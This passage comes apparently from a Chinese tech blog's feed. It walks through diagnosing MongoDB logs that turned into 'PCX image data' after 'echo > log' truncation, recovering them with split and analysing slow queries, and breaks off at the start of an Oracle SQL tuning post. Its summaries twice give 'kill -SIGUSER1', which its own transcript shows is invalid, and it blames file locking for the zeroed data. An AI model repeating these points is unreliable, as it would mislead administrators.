: 1, "b" : 1 &#125;</span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> <span class="keyword">for</span> (i=1;i&lt;200000;i++)&#123;</span></span><br><span class="line">... db.t1.insert(&#123;id:i&#125;)&#125;</span><br><span class="line">WriteResult(&#123; "nInserted" : 1 &#125;)</span><br><span class="line"></span><br><span class="line">[root@sh_01 ~]# cd /alidata/mongodb/logs</span><br><span class="line">[root@sh_01 log]# ll</span><br><span class="line">-rw-r--r-- 1 root root 2182 Aug  3 10:28 mongod27017.log</span><br><span class="line">-rw-r--r-- 1 root root 3100 Aug  2 14:19 mongod27017.log.2018-08-02T07-18-27</span><br><span class="line">-rw-r--r-- 1 root root 1526 Aug  2 15:18 mongod27017.log.2018-08-02T07-18-54</span><br><span class="line">[root@sh_01 log]# file *</span><br><span class="line">mongod27017.log:                     ASCII text, with very long lines</span><br><span class="line">mongod27017.log.2018-08-02T07-18-27: ASCII text, with very long lines</span><br><span class="line">mongod27017.log.2018-08-02T07-18-54: ASCII text, with very long lines</span><br><span class="line"></span><br><span class="line">[root@sh_01 log]# echo &gt; mongod27017.log</span><br><span class="line">[root@sh_01 log]# echo &gt; mongod27017.log</span><br><span class="line">[root@sh_01 log]# ll</span><br><span class="line">total 12</span><br><span class="line">-rw-r--r-- 1 root root    1 Aug  3 10:29 mongod27017.log</span><br><span class="line">-rw-r--r-- 1 root root 3100 Aug  2 14:19 mongod27017.log.2018-08-02T07-18-27</span><br><span class="line">-rw-r--r-- 1 root root 1526 Aug  2 15:18 mongod27017.log.2018-08-02T07-18-54</span><br><span class="line">[root@sh_01 log]# file *</span><br><span class="line">mongod27017.log:                     very short file (no magic)</span><br><span class="line">mongod27017.log.2018-08-02T07-18-27: ASCII text, with very long lines</span><br><span class="line">mongod27017.log.2018-08-02T07-18-54: ASCII text, with very long lines</span><br><span class="line"></span><br><span class="line">[root@sh_01 log]# tail -f mongod27017.log</span><br><span class="line"></span><br><span class="line">2018-08-03T10:30:21.936+0800 I NETWORK  [initandlisten] connection accepted from 127.0.0.1:43720 #2 (2 connections now open)</span><br><span class="line"></span><br><span class="line">[root@sh_01 log]# ll -h</span><br><span class="line">total 12K</span><br><span class="line">-rw-r--r-- 1 root root 2.8K Aug  3 10:30 mongod27017.log</span><br><span class="line">-rw-r--r-- 1 root root 3.1K Aug  2 14:19 mongod27017.log.2018-08-02T07-18-27</span><br><span class="line">-rw-r--r-- 1 root root 1.5K Aug  2 15:18 mongod27017.log.2018-08-02T07-18-54</span><br><span class="line">[root@sh_01 log]# file *</span><br><span class="line">mongod27017.log:                     PCX ver. 2.5 image data</span><br><span class="line">mongod27017.log.2018-08-02T07-18-27: ASCII text, with very long lines</span><br><span class="line">mongod27017.log.2018-08-02T07-18-54: ASCII text, with very long lines</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 一边不断产生日志，一边多次执行<span class="built_in">echo</span>&gt; </span></span><br><span class="line">[root@sh_01 log]# echo &gt; mongod27017.log</span><br><span class="line">[root@sh_01 log]# echo &gt; mongod27017.log</span><br><span class="line">[root@sh_01 log]# file *</span><br><span class="line">mongod27017.log:                     PCX ver. 2.5 image data</span><br><span class="line">mongod27017.log.2018-08-02T07-18-27: ASCII text, with very long lines</span><br><span class="line">mongod27017.log.2018-08-02T07-18-54: ASCII text, with very long lines</span><br><span class="line">mongod27017.log.2018-08-03T03-09-08: PCX ver. 2.5 image data</span><br><span class="line">[root@sh_01 log]# echo &gt; mongod27017.log</span><br><span class="line">[root@sh_01 log]# file *</span><br><span class="line">mongod27017.log:                     very short file (no magic)</span><br><span class="line">mongod27017.log.2018-08-02T07-18-27: ASCII text, with very long lines</span><br><span class="line">mongod27017.log.2018-08-02T07-18-54: ASCII text, with very long lines</span><br><span class="line">mongod27017.log.2018-08-03T03-09-08: PCX ver. 2.5 image data</span><br><span class="line">[root@sh_01 log]# ll -h</span><br><span class="line">total 16K</span><br><span class="line">-rw-r--r-- 1 root root    1 Aug  3 11:28 mongod27017.log</span><br><span class="line">-rw-r--r-- 1 root root 3.1K Aug  2 14:19 mongod27017.log.2018-08-02T07-18-27</span><br><span class="line">-rw-r--r-- 1 root root 1.5K Aug  2 15:18 mongod27017.log.2018-08-02T07-18-54</span><br><span class="line">-rw-r--r-- 1 root root 2.9K Aug  3 11:05 mongod27017.log.2018-08-03T03-09-08</span><br><span class="line">[root@sh_01 log]# file *</span><br><span class="line">mongod27017.log:                     very short file (no magic)</span><br><span class="line">mongod27017.log.2018-08-02T07-18-27: ASCII text, with very long lines</span><br><span class="line">mongod27017.log.2018-08-02T07-18-54: ASCII text, with very long lines</span><br><span class="line">mongod27017.log.2018-08-03T03-09-08: PCX ver. 2.5 image data</span><br><span class="line">[root@sh_01 log]# file *</span><br><span class="line">mongod27017.log:                     PCX ver. 2.5 image data</span><br><span class="line">mongod27017.log.2018-08-02T07-18-27: ASCII text, with very long lines</span><br><span class="line">mongod27017.log.2018-08-02T07-18-54: ASCII text, with very long lines</span><br><span class="line">mongod27017.log.2018-08-03T03-09-08: PCX ver. 2.5 image data</span><br><span class="line">[root@sh_01 log]# hexdump -c mongod27017.log</span><br><span class="line">0000000  \n  \0  \0  \0  \0  \0  \0  \0  \0  \0  \0  \0  \0  \0  \0  \0</span><br><span class="line">0000010  \0  \0  \0  \0  \0  \0  \0  \0  \0  \0  \0  \0  \0  \0  \0  \0</span><br><span class="line">*</span><br><span class="line">0000850  \0  \0  \0  \0  \0  \0  \0   2   0   1   8   -   0   8   -   0</span><br><span class="line">0000860   3   T   1   1   :   2   9   :   0   6   .   7   2   9   +   0</span><br><span class="line">0000870   8   0   0       I       A   C   C   E   S   S               [</span><br><span class="line">0000880   c   o   n   n   3   ]       U   n   a   u   t   h   o   r   i</span><br><span class="line">0000890   z   e   d   :       n   o   t       a   u   t   h   o   r   i</span><br><span class="line">00008a0   z   e   d       o   n       t   e   s   t       t   o       e</span><br><span class="line">00008b0   x   e   c   u   t   e       c   o   m   m   a   n   d       &#123;</span><br><span class="line">00008c0       f   i   n   d   :       "   t   1   "   ,       f   i   l</span><br><span class="line">00008d0   t   e   r   :       &#123;   &#125;       &#125;  \n</span><br></pre></td></tr></table></figure><p>成功复现了客户的情况：</p><ol><li><p>第一次<code>echo &gt; log</code>，文件头部新增<code>\n</code></p></li><li><p>多次<code>echo &gt; log</code>,文件头部如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0000000  \n  \0  \0  \0  \0  \0  \0  \0  \0  \0  \0  \0  \0  \0  \0  \0</span><br><span class="line">0000010  \0  \0  \0  \0  \0  \0  \0  \0  \0  \0  \0  \0  \0  \0  \0  \0</span><br><span class="line">*</span><br></pre></td></tr></table></figure></li></ol><p>确实是mongodb日志轮询出了问题：</p><ol><li><code>echo &gt; log</code>会往文件头部插入<code>\n</code>即16进制的<code>0a</code></li><li>在数据库正常运行中，对log文件是加了锁的，强制执行<code>echo &gt; log</code>是无法进行覆盖的，会将所有的数据全部置为<code>0</code></li><li>强制覆盖后，文件头部变成了无数的空白</li></ol><h3 id="待解决问题"><a href="#待解决问题" class="headerlink" title="待解决问题"></a>待解决问题</h3><ul><li>MongoDB日志轮询方法调整为<strong>kill -SIGUSER1 [mongodpid]</strong></li><li>修复目前已经变为图片格式的日志，并拉取15点到16点的日志</li></ul><h2 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h2><h3 id="MongoDB日志轮询"><a href="#MongoDB日志轮询" class="headerlink" title="MongoDB日志轮询"></a>MongoDB日志轮询</h3><h4 id="测试环境"><a href="#测试环境" class="headerlink" title="测试环境"></a>测试环境</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">[root@sh_01 log]# pidof mongod</span><br><span class="line">1828</span><br><span class="line">[root@sh_01 log]# kill -SIGUSER1 1828</span><br><span class="line">-bash: kill: SIGUSER1: invalid signal specification</span><br><span class="line">[root@sh_01 log]# kill -SIGUSR1 1828</span><br><span class="line">[root@sh_01 log]# ll</span><br><span class="line">total 16</span><br><span class="line">-rw-r--r-- 1 root root 1526 Aug  3 11:09 mongod27017.log</span><br><span class="line">-rw-r--r-- 1 root root 3100 Aug  2 14:19 mongod27017.log.2018-08-02T07-18-27</span><br><span class="line">-rw-r--r-- 1 root root 1526 Aug  2 15:18 mongod27017.log.2018-08-02T07-18-54</span><br><span class="line">-rw-r--r-- 1 root root 2942 Aug  3 11:05 mongod27017.log.2018-08-03T03-09-08</span><br><span class="line">[root@sh_01 log]# file *</span><br><span class="line">mongod27017.log:                     ASCII text, with very long lines</span><br><span class="line">mongod27017.log.2018-08-02T07-18-27: ASCII text, with very long lines</span><br><span class="line">mongod27017.log.2018-08-02T07-18-54: ASCII text, with very long lines</span><br><span class="line">mongod27017.log.2018-08-03T03-09-08: PCX ver. 2.5 image data</span><br></pre></td></tr></table></figure><h4 id="生产环境"><a href="#生产环境" class="headerlink" title="生产环境"></a>生产环境</h4><p><img src="%E5%88%A9%E7%94%A8split%E5%B7%A5%E5%85%B7%E8%A7%A3%E5%86%B3%E4%B8%80%E6%AC%A1MongoDB%E6%97%A5%E5%BF%97%E5%BC%82%E5%B8%B8%E9%97%AE%E9%A2%98/04.png" alt=""></p><p>修改日志轮询脚本：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">[root@MONGO-SHARD-18 logs]# cat /etc/init.d/mongo_logspit.sh </span><br><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 2018/08/02 Apple</span></span><br><span class="line"><span class="meta">#</span><span class="bash">Rotate the MongoDB logs to prevent a single logfile from consuming too much disk space.</span></span><br><span class="line"></span><br><span class="line">cmd=mongod</span><br><span class="line">mongodpath=/opt/mongodb/bin</span><br><span class="line">pidarray=`pidof $&#123;mongodpath&#125;/$cmd`</span><br><span class="line">LOGPATH_SHARD=/data/mongodb/shard1/logs</span><br><span class="line"></span><br><span class="line">for pid in $pidarray;do</span><br><span class="line">if [ $pid ]</span><br><span class="line">then</span><br><span class="line">    kill -SIGUSR1 $pid</span><br><span class="line">fi</span><br><span class="line">done</span><br><span class="line"><span class="meta">#</span><span class="bash">clear logfile more than 7 days</span></span><br><span class="line">cd $LOGPATH_SHARD</span><br><span class="line">find ./ -xdev -mtime +7 -name "shard.log.*" -exec rm -f &#123;&#125;  \;</span><br></pre></td></tr></table></figure><p>所有的分片都去执行：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kill -SIGUSR1 pidof mongod</span><br></pre></td></tr></table></figure><p>分片15操作如下：其他分片同样</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">[zyadmin@MONGO-SHARD-15 ~]$ sudo -i</span><br><span class="line">[root@MONGO-SHARD-15 ~]# cd /data/mongodb/shard1/logs/</span><br><span class="line">[root@MONGO-SHARD-15 logs]# ll -h</span><br><span class="line">total 1.7G</span><br><span class="line">-rw-r--r-- 1 root root 20G Aug  2 15:27 shard.log</span><br><span class="line">-rw-r--r-- 1 root root 19G Jul 25 23:50 shard.log.2018-07-25</span><br><span class="line">-rw-r--r-- 1 root root 19G Jul 26 23:50 shard.log.2018-07-26</span><br><span class="line">-rw-r--r-- 1 root root 19G Jul 27 23:50 shard.log.2018-07-27</span><br><span class="line">-rw-r--r-- 1 root root 20G Jul 28 23:50 shard.log.2018-07-28</span><br><span class="line">-rw-r--r-- 1 root root 20G Jul 29 23:50 shard.log.2018-07-29</span><br><span class="line">-rw-r--r-- 1 root root 20G Jul 30 23:50 shard.log.2018-07-30</span><br><span class="line">-rw-r--r-- 1 root root 20G Jul 31 23:50 shard.log.2018-07-31</span><br><span class="line">-rw-r--r-- 1 root root 20G Aug  1 23:50 shard.log.2018-08-01</span><br><span class="line">[root@MONGO-SHARD-15 logs]# file *</span><br><span class="line">shard.log:            PCX ver. 2.5 image data</span><br><span class="line">shard.log.2018-07-25: PCX ver. 2.5 image data</span><br><span class="line">shard.log.2018-07-26: PCX ver. 2.5 image data</span><br><span class="line">shard.log.2018-07-27: PCX ver. 2.5 image data</span><br><span class="line">shard.log.2018-07-28: PCX ver. 2.5 image data</span><br><span class="line">shard.log.2018-07-29: PCX ver. 2.5 image data</span><br><span class="line">shard.log.2018-07-30: PCX ver. 2.5 image data</span><br><span class="line">shard.log.2018-07-31: PCX ver. 2.5 image data</span><br><span class="line">shard.log.2018-08-01: PCX ver. 2.5 image data</span><br><span class="line">[root@MONGO-SHARD-15 logs]# kill -SIGUSR1 `pidof mongod`</span><br><span class="line">[root@MONGO-SHARD-15 logs]# file *</span><br><span class="line">shard.log:                     ASCII text, with very long lines</span><br><span class="line">shard.log.2018-07-25:          PCX ver. 2.5 image data</span><br><span class="line">shard.log.2018-07-26:          PCX ver. 2.5 image data</span><br><span class="line">shard.log.2018-07-27:          PCX ver. 2.5 image data</span><br><span class="line">shard.log.2018-07-28:          PCX ver. 2.5 image data</span><br><span class="line">shard.log.2018-07-29:          PCX ver. 2.5 image data</span><br><span class="line">shard.log.2018-07-30:          PCX ver. 2.5 image data</span><br><span class="line">shard.log.2018-07-31:          PCX ver. 2.5 image data</span><br><span class="line">shard.log.2018-08-01:          PCX ver. 2.5 image data</span><br><span class="line">shard.log.2018-08-02T07-27-29: PCX ver. 2.5 image data</span><br><span class="line">[root@MONGO-SHARD-15 logs]# ll -h</span><br><span class="line">total 1.7G</span><br><span class="line">-rw-r--r-- 1 root root 2.0K Aug  2 15:27 shard.log</span><br><span class="line">-rw-r--r-- 1 root root  19G Jul 25 23:50 shard.log.2018-07-25</span><br><span class="line">-rw-r--r-- 1 root root  19G Jul 26 23:50 shard.log.2018-07-26</span><br><span class="line">-rw-r--r-- 1 root root  19G Jul 27 23:50 shard.log.2018-07-27</span><br><span class="line">-rw-r--r-- 1 root root  20G Jul 28 23:50 shard.log.2018-07-28</span><br><span class="line">-rw-r--r-- 1 root root  20G Jul 29 23:50 shard.log.2018-07-29</span><br><span class="line">-rw-r--r-- 1 root root  20G Jul 30 23:50 shard.log.2018-07-30</span><br><span class="line">-rw-r--r-- 1 root root  20G Jul 31 23:50 shard.log.2018-07-31</span><br><span class="line">-rw-r--r-- 1 root root  20G Aug  1 23:50 shard.log.2018-08-01</span><br><span class="line">-rw-r--r-- 1 root root  20G Aug  2 15:27 shard.log.2018-08-02T07-27-29</span><br></pre></td></tr></table></figure><h3 id="修复异常日志"><a href="#修复异常日志" class="headerlink" title="修复异常日志"></a>修复异常日志</h3><h4 id="修复思路"><a href="#修复思路" class="headerlink" title="修复思路"></a>修复思路</h4><p>弄清楚日志变更的原因以及复现过程后，不难发现，日志因为头部变化从而导致文件格式变更。因此推测异常日志的组成如下：</p><ol><li>头部为<code>0a</code></li><li>中间全部都是<code>0</code></li><li>最后是正常的字符串记录着mongodb的日志信息，类似于<code>2018-08-03T10:30:21.936+0800 I NETWORK  [initandlisten] connection accepted from 127.0.0.1:43720 #2 (2 connections now open)</code>由日志和日志明细组成</li></ol><p>因此修复的思路如下：</p><ul><li>23G的日志，首先按照大小6G做切分<code>split -b 6G log</code>，切分成4个文件</li><li>查看切分后的日志格式，如果最后一个日志为<code>ASCII text</code>则不再切分否则，将最后一个日志继续切分</li><li>循环上一步，直到最后一个文件切分出来没有<code>ASCII text</code>为止</li></ul><h4 id="操作明细"><a href="#操作明细" class="headerlink" title="操作明细"></a>操作明细</h4><blockquote><p>日志轮询的部署距离现在大概4个月</p></blockquote><ol><li><p>第一次将23G的文件以6G切分成4个文件：xaa\xab\xac\xad，查看4个文件的属性为</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">xaa:               PCX ver. 2.5 image data</span><br><span class="line">xab:               PCX ver. 2.5 image data</span><br><span class="line">xac:               PCX ver. 2.5 image data</span><br><span class="line">xad:                PCX ver. 2.5 image data</span><br></pre></td></tr></table></figure></li><li><p>重命名xad为x1第二次切分x1 5G，按照1G切分成5份，查看文件属性</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">xaa:               PCX ver. 2.5 image data</span><br><span class="line">xab:               PCX ver. 2.5 image data</span><br><span class="line">xac:               PCX ver. 2.5 image data</span><br><span class="line">xad:                PCX ver. 2.5 image data</span><br><span class="line">xae:                ASCII text, with very long lines</span><br></pre></td></tr></table></figure></li><li><p>重名xad 为 x2 按照15M的大小切分，查看文件的属性如下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">xaa:      PCX ver. 2.5 image data</span><br><span class="line">此处省略。。。</span><br><span class="line">xdo:               PCX ver. 2.5 image data</span><br><span class="line">xdp:               ASCII text, with very long lines</span><br><span class="line">xdq:               ASCII text, with very long lines</span><br><span class="line">xdr:               ASCII text, with very long lines</span><br><span class="line">xds:               ASCII text, with very long lines</span><br><span class="line">xdt:               ASCII text, with very long lines</span><br><span class="line">xdu:               ASCII text, with very long lines</span><br><span class="line">xdv:               UTF-8 Unicode text, with very long lines</span><br><span class="line">xdw:               ASCII text, with very long lines</span><br><span class="line">xdx:               ASCII text, with very long lines</span><br><span class="line">xdy:               ASCII text, with very long lines</span><br></pre></td></tr></table></figure></li><li><p>切分后文件类型为<code>ASCII text</code>的文件中找到15点~16点的文档</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[root@sh_01 mongolog_20180801]# head -n 2 xdv</span><br><span class="line">re: "x86_64", version: "Kernel 3.10.0-693.2.2.el7.x86_64" &#125; &#125;</span><br><span class="line">2018-08-01T16:13:44.958+0800 I ACCESS   [conn4972925] Successfully authenticated as principal __system on local</span><br><span class="line">[root@sh_01 mongolog_20180801]# head -n 2 xdu</span><br><span class="line">38422 #4967772 (445 connections now open)</span><br><span class="line">2018-08-01T14:00:10.575+0800 I NETWORK  [thread1] connection accepted from 172.16.0.44:38430 #4967773 (446 connections now open)</span><br></pre></td></tr></table></figure></li></ol><ul><li><code>xdv</code> 的头部是<code>2018-08-01T16:13:44.958+0800</code>,因此可以确定15~16的日志在xdu中</li><li><code>xdu</code>记录的日志时间段为<code>2018-08-01T14:00:10.575+0800</code>~<code>2018-08-01T16:13:44.958+0800</code></li><li>重命名<code>xdu</code>为<code>mongolog.18.14_16</code></li></ul><h3 id="分析日志"><a href="#分析日志" class="headerlink" title="分析日志"></a>分析日志</h3><h4 id="分析命令"><a href="#分析命令" class="headerlink" title="分析命令"></a>分析命令</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 获取08月01号下午3点开始到4点执行时间超过5秒的查询</span></span><br><span class="line">mlogfilter mongolog.18.14_16 --from 2018-08-01T15 --to "+1h" --slow 5000 &gt; slowlog.txt</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 获取08月01号下午3点开始到4点语句的执行次数、用时等统计信息</span></span><br><span class="line">mloginfo slowlog.txt  --queries &gt; an_slowlog.txt</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 通过mplotqueries进行慢查询散点分布图绘制，且只返回前10个</span></span><br><span class="line">mplotqueries slowlog.txt --output-file 01.png --logscale --group-limit 10</span><br></pre></td></tr></table></figure><h4 id="慢查询散点分布图"><a href="#慢查询散点分布图" class="headerlink" title="慢查询散点分布图"></a>慢查询散点分布图</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[root@sh_01 booboo]# mplotqueries slowlog.txt --output-file 01.png --logscale --group-limit 10</span><br><span class="line">                                                                                          </span><br><span class="line">SCATTER plot</span><br><span class="line">   id   #points  group</span><br><span class="line">    1       692  order.order</span><br><span class="line">    2       615  omdmain.item_region_erp</span><br><span class="line">    3         1  omdmain.customer</span><br><span class="line">()</span><br></pre></td></tr></table></figure><p><img src="%E5%88%A9%E7%94%A8split%E5%B7%A5%E5%85%B7%E8%A7%A3%E5%86%B3%E4%B8%80%E6%AC%A1MongoDB%E6%97%A5%E5%BF%97%E5%BC%82%E5%B8%B8%E9%97%AE%E9%A2%98/10.png" alt=""></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><h3 id="mongodb日志轮询的问题"><a href="#mongodb日志轮询的问题" class="headerlink" title="mongodb日志轮询的问题"></a>mongodb日志轮询的问题</h3><ol><li><code>echo &gt; log</code>会往文件头部插入<code>\n</code>即16进制的<code>0a</code></li><li>在数据库正常运行中，对log文件是加了锁的，强制执行<code>echo &gt; log</code>是无法进行覆盖的，会将所有的数据全部置为<code>0</code></li><li>强制覆盖后，文件头部变成了无数的空白</li></ol><h3 id="问题解决"><a href="#问题解决" class="headerlink" title="问题解决"></a>问题解决</h3><ul><li>MongoDB日志轮询方法调整为<strong>kill -SIGUSER1 [mongodpid]</strong></li><li>修复目前已经变为图片格式的日志，并拉取15点到16点的日志</li></ul><p>该case花了一整天，从怀疑被攻击到确认是日志轮询引起文件格式变更是一个关键转折点；</p><p>另外PCX格式是第一次碰到，疑惑了半天~最后是@培尧发现了<code>echo</code>的端倪，@衾袭@大宝去验证最终确认了问题的根源。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;摘要： &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;某天晚上刚到家不久，就接到杭州同事的电话，客户MongoDB集群中的某个分片节点CPU飙高，初步判断是慢查询，现在需要拉取CPU飙高时间段的慢查询。心想拉取慢查询应该很快，不就是个系统日志吗？而且还做了日志切割一天一个，按道理很快搞定的，谁知当天晚上搞了接近三个小时也没搞定。究竟发生了什么？&lt;/li&gt;
&lt;li&gt;进入到日志目录一看，目前保留近7天的日志，每天的日志量在23G~24G，我当时就想这个客户数据量这么大！后续发现日志格式本该为普通文本文件确变成了图片格式，究竟为何会文件格式会转变？能否从图片格式中拉取指定时间段的日志呢？&lt;/li&gt;
&lt;li&gt;第二天到公司，由于客户环境我们也是第一次接手，因此咱们技术专家团队搞了一个3人的”专家会诊”，经过了一番折腾总算把原因找到了，具体过程请看下文！&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
    
      <category term="技术广角" scheme="http://www.toberoot.com/categories/%E6%8A%80%E6%9C%AF%E5%B9%BF%E8%A7%92/"/>
    
      <category term="MongoDB" scheme="http://www.toberoot.com/categories/%E6%8A%80%E6%9C%AF%E5%B9%BF%E8%A7%92/MongoDB/"/>
    
    
      <category term="数据救援" scheme="http://www.toberoot.com/tags/%E6%95%B0%E6%8D%AE%E6%95%91%E6%8F%B4/"/>
    
  </entry>
  
  <entry>
    <title>Oracle数据库SQL优化_索引缺失</title>
    <link href="http://www.toberoot.com/2018/05/29/booboo_others/oracle%E6%95%B0%E6%8D%AE%E5%BA%93SQL%E4%BC%98%E5%8C%96-%E7%B4%A2%E5%BC%95%E7%BC%BA%E5%A4%B1/"/>
    <id>http://www.toberoot.com/2018/05/29/booboo_others/oracle%E6%95%B0%E6%8D%AE%E5%BA%93SQL%E4%BC%98%E5%8C%96-%E7%B4%A2%E5%BC%95%E7%BC%BA%E5%A4%B1/</id>
    <published>2018-05-28T18:09:32.000Z</published>
    <updated>2020-03-22T08:32:42.573Z</updated>
    
    <content type="html"><![CDATA[<p>摘要：Oracle数据库做了迁移，从原来的DG迁移到新库RAC，小版本不同；老库中相同的SQL执行只需要11秒，而新库需要360秒甚至800多秒，如何进行复杂查询的SQL优化，本文提供通用的一个思路。</p><a id="more"></a><h2 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h2><p>oracle数据库做了迁移，从原来的DG迁移到新库RAC，小版本不同；</p><p>老库中相同的SQL执行只需要11秒，而新库需要360秒甚至800多秒。</p><table><thead><tr><th>库</th><th>原查询时间</th><th>优化后的查询时间</th></tr></thead><tbody><tr><td>老库</td><td>11秒</td><td>1.4秒 缓存后 0.4秒</td></tr><tr><td>新库RAC</td><td>360秒</td><td>1.4秒 缓存后0.4秒排查思路</td></tr></tbody></table><h2 id="待优化SQL"><a href="#待优化SQL" class="headerlink" title="待优化SQL"></a>待优化SQL</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span 